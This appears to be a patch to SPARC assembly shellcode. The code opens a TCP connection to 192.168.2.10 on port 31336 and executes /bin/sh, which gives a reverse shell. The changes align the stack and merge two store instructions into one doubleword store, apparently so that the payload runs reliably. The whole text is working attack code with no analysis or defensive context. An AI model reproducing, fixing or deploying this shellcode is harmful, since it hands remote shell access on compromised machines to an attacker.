@@ -19,6 +19,8 @@
 .globl main
 
 main:
+	andn	%sp, 7, %sp
+
 	xor	%o3, %o3, %o2
 	mov	0x01, %o1
 	mov	0x02, %o0
@@ -41,8 +43,7 @@ main:
 	ld	[ %sp - 0x08 ], %o0
 	set	0xff027a68, %l0
 	set	0xc0a8020a, %l1
-	st	%l0, [ %sp - 0x10 ]
-	st	%l1, [ %sp - 0x0c ]
+	std	%l0, [ %sp - 0x10 ]
 	sub	%sp, 16, %o1
 	mov	0x10, %o2
 	mov	0x62, %g1 
@@ -53,8 +54,7 @@ main:
 	set	0x2f736800, %l1
 	sub	%sp, 0x10, %o0
 	sub	%sp, 0x08, %o1
-	st	%l0, [ %sp - 0x10 ]	
-	st	%l1, [ %sp - 0x0c ]	
+	std	%l0, [ %sp - 0x10 ]	
 	st	%o0, [ %sp - 0x08 ]
 	st	%g0, [ %sp - 0x04 ]
 	mov	0x3b, %g1
